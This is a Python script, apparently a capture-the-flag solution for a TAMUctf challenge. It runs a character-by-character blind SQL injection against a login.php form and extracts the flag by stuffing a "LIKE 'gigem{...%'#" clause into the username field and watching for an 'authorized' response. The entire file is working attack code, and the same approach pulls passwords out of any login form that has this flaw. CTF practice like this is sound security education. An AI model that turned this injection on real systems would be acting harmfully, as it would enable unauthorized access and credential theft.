from urllib.parse import urlencode
from urllib.request import Request, urlopen

url = 'http://passwordextraction.tamuctf.com/login.php' # Set destination URL here
base = 'admin\' AND password LIKE \'gigem{'

i=31
while True:
	if(i==95 or i==37): #escape wildcards
		user = base + "\\" + chr(i) +"%'#"
	else:
		user = base + chr(i) +"%'#"
	#print("[DEBUG] " + user)
	post_fields = {'username': user,'password':''}     # Set POST fields here

	request = Request(url, urlencode(post_fields).encode())
	json = urlopen(request).read().decode()
	#print("[DEBUG] " + json)
	if("authorized" in json):
		print("found one char")
		base=base+chr(i)
		if(chr(i)=='}'):
			break
		i=31
	i+=1

print(base)
